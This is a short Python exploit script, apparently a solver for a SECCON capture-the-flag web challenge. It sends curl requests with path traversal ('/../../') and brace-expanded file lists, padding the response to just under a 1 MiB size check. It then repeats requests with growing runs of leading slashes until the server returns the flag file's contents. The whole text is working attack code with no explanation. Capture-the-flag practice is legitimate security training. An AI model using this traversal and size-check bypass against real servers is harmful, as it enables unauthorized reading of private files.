import os
import re
import subprocess

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def curl(files: list[str]) -> bytes:
    proc = subprocess.run(
        [
            "curl",
            "--globoff",
            "--path-as-is",
            BASE_URL + "/../../{" + ",".join(files) + "}",
        ],
        capture_output=True
    )
    assert proc.returncode == 0
    return proc.stdout


files = [
    "bin/tar",
    "bin/sed",
    "bin/gunzip",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
    "app/package.json",
]

assert len(curl(files)) < 1024 * 1024
assert len(curl(files)) == 1048467

for i in range(1000):
    flag_file = "/"*i + "flag.txt"
    stdout = curl(files + [flag_file]).decode()
    if stdout == "🤔":
        continue
    else:
        print(f"{i = }")
        print(re.search(r"SECCON{\w+", stdout).group(0) + "}")
        exit(0)
print("Failed")
